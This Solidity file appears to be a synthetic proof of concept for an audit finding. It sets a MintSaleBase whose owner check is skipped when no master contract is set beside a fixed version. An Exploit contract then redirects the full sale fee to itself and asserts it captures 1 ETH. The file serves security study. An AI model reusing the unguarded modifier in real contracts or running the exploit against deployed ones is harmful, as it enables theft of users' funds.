// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Vibe MintSaleBase — setVibeFees is open on the implementation
    (MixBytes, AuditVault 27818).
    SYNTHETIC, cheatcode-free. The implementation has no master contract.
    onlyMasterContractOwner then does not check msg.sender. Audited fix at
    MintSaleBase.sol L69 is `require(msg.sender == owner())`.
    feeTake is a BPS fraction (M-1: feeTake <= BPS). A 1 ETH buy with
    feeTake 10000 pays 1 ETH to the attacker treasury. The owner fee of
    500 bps pays 0.05 ETH to the protocol and 0 to the attacker. */

contract MintSaleBase {
    uint256 public constant BPS = 10000;

    address public masterContract;
    address public owner;
    address public vibeTreasury;
    uint256 public feeTake;
    uint256 public sellerProceeds;

    modifier onlyMasterContractOwner() {
        if (masterContract != address(0)) {
            require(msg.sender == MintSaleBase(masterContract).owner(), "not owner");
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function setVibeFees(address vibeTreasury_, uint256 feeTake_) external onlyMasterContractOwner {
        // @> VULN: masterContract is 0, so this write is not limited to owner().
        vibeTreasury = vibeTreasury_;
        feeTake = feeTake_;
    }

    function buy() external payable {
        uint256 fee = msg.value * feeTake / BPS;
        uint256 rest = msg.value - fee;
        (bool ok,) = vibeTreasury.call{value: fee}("");
        require(ok, "fee");
        sellerProceeds += rest;
    }
}

contract FixedMintSaleBase {
    uint256 public constant BPS = 10000;
    address public owner;
    address public vibeTreasury;
    uint256 public feeTake;
    uint256 public sellerProceeds;

    modifier onlyMasterContractOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function setVibeFees(address vibeTreasury_, uint256 feeTake_) external onlyMasterContractOwner {
        require(vibeTreasury_ != address(0), "treasury");
        require(feeTake_ <= BPS, "bps");
        vibeTreasury = vibeTreasury_;
        feeTake = feeTake_;
    }

    function buy() external payable {
        uint256 fee = msg.value * feeTake / BPS;
        uint256 rest = msg.value - fee;
        (bool ok,) = vibeTreasury.call{value: fee}("");
        require(ok, "fee");
        sellerProceeds += rest;
    }
}

contract Exploit {
    MintSaleBase public sale;
    uint256 public feeTaken;
    uint256 public sellerGot;

    constructor() {
        sale = new MintSaleBase();
    }

    receive() external payable {}

    function run() external payable {
        require(sale.masterContract() == address(0), "not implementation");
        require(msg.value == 1 ether, "1 eth");
        uint256 beforeBal = address(this).balance - msg.value;
        sale.setVibeFees(address(this), sale.BPS());
        require(sale.vibeTreasury() == address(this), "treasury");
        require(sale.feeTake() == 10000, "feeTake");
        sale.buy{value: msg.value}();
        feeTaken = address(this).balance - beforeBal;
        sellerGot = sale.sellerProceeds();
        require(feeTaken == 1 ether, "attacker took 1 eth");
        require(sellerGot == 0, "seller got nothing");
        require(address(sale).balance == 0, "sale kept the fee");
    }
}
